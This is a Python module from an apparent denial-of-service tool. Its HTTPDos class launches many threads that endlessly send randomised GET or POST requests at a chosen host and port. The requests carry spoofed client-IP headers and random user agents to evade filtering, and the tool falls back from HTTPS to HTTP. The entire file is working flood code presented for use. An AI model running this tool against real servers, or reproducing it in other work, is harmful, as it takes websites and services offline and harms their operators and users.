import socket
import ssl
import random
import json
import os
import sys
import itertools
import string
from threading import Thread
from src.utils import color_text
from src.config import TCP, DEFAULT_NUM_THREADS


class HTTPDos():

    def __init__(self, args):
        self.target_ip = args.target
        self.target_port = args.port
        self.protocol = args.attack
        self.http_method = args.http_method
        self.threads = args.threads if args.threads is not None else DEFAULT_NUM_THREADS
        self.monothread = args.monothread if args.monothread is not None else False
        self.ssl_available = False
        self.request_func = self.get_request_func()
        self.counter = itertools.count(1)

    def get_request_func(self):
        methods = {
            'GET': self.get_http_request,
            'POST': self.post_http_request,
        }
        if self.http_method not in methods:
            raise ValueError(
                f"[!] Unsupported HTTP method: {self.http_method}")
        return methods[self.http_method]

    def start_flood(self):
        """
        HTTP(S) flood
        """
        color_text('green', '[+] Connect to send request')

        try:
            if self.protocol not in ('http', 'https'):
                raise ValueError(f"Unsupported protocol: {self.protocol}")

            if self.protocol == 'https':
                self.ssl_available = self.test_ssl_connection()

                if self.ssl_available:
                    color_text('green', '[+] Sending request\n')
                    self.run_attack_loop()
                else:
                    self.target_port = 80
                    if self.send_packet:
                        color_text(
                            'blue', f'[*] {self.target_ip} with HTTP on port {self.target_port} is available\n')
                        while True:
                            if (match := input(f"Do you want send packet to {self.target_ip} on port {self.target_port} ? [yes, no] : ").strip().lower()) in ('yes', 'no'):
                                if match == 'no':
                                    sys.exit('Bye !')
                                break

                        color_text('green', '[+] Sending request\n')
                        self.run_attack_loop()
            elif self.protocol == 'http':
                color_text('green', '[+] Sending request\n')
                self.run_attack_loop()

        except Exception as e:
            color_text('red', f'[!] Error: {e}')

    def run_attack_loop(self):
        if self.monothread:
            return self.compile_attack_loop()
        else:
            for _ in range(self.threads):
                thread = Thread(target=self.compile_attack_loop)
                thread.start()

    def compile_attack_loop(self):
        try:
            while True:
                self.send_packet()
                self.count_requests()
        except KeyboardInterrupt:
            color_text('red', "\n[!] Interrupted by user.")
            sys.exit(0)

    def send_packet(self):
        sock = socket.socket(socket.AF_INET, TCP)

        if self.ssl_available:
            ssl_cert = ssl.create_default_context()
            sock = ssl_cert.wrap_socket(sock, server_hostname=self.target_ip)
        try:
            sock.connect((self.target_ip, self.target_port))
            # call var with () at the end to call function
            sock.send(self.request_func())
        except (socket.timeout, socket.error, ssl.SSLError) as e:
            print(f"Errors while sending the request : {e}")
        finally:
            sock.close()

    def test_ssl_connection(self):
        """Check if SSL is available"""
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            ssl_sock = context.wrap_socket(
                sock, server_hostname=self.target_ip)

            # connection
            ssl_sock.connect((self.target_ip, self.target_port))
            ssl_sock.send(self.get_http_request())
            ssl_sock.close()

            return True  # SSL valid
        except:
            color_text(
                'red', f"\r\n[!] HTTPS on port {self.target_port} isn't available, test with http !\r\n")
            self.attack = 'http'  # if https is not valide, test on http port 80 by default

            return False

    def count_requests(self):

        request_nb = next(self.counter)

        if request_nb % 10_000 == 0:
            sys.stdout.write(f'{request_nb} request send !\r\n')
            sys.stdout.flush()

    def get_http_request(self):
        random_ip = self.http_random_ip()

        header = f"GET /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += '\r\n\r\n'
        return header.encode()

    def post_http_request(self):
        random_ip = self.http_random_ip()
        body_content = f"{self.http_random_param()}&{self.http_random_param()}"

        header = f"POST /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += f'Content-Length: {len(body_content)}'
        header += '\r\n\r\n'
        body = body_content

        return (header + body + '\r\n\r\n').encode()

    def http_random_agent(self):
        """Select a random agent from the list"""
        path = os.path.join('src', 'random-agent.json')
        with open(path, 'r') as f:
            data = json.load(f)
        return data[random.randint(0, len(data)-1)]['useragent']

    def http_random_param(self):
        """Generate a random GET parameter and value"""
        param = ''.join(random.choices(
            string.ascii_lowercase, k=random.randint(2, 10)))
        value = ''.join(random.choices(
            string.ascii_lowercase, k=random.randint(2, 10)))
        return f"{param}={value}"

    def http_random_ip(self):
        """Generate a random ip"""
        return ".".join(str(random.randint(15, 220)) for _ in range(4))

    def http_random_resource(self):
        """Generate random resource"""
        return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
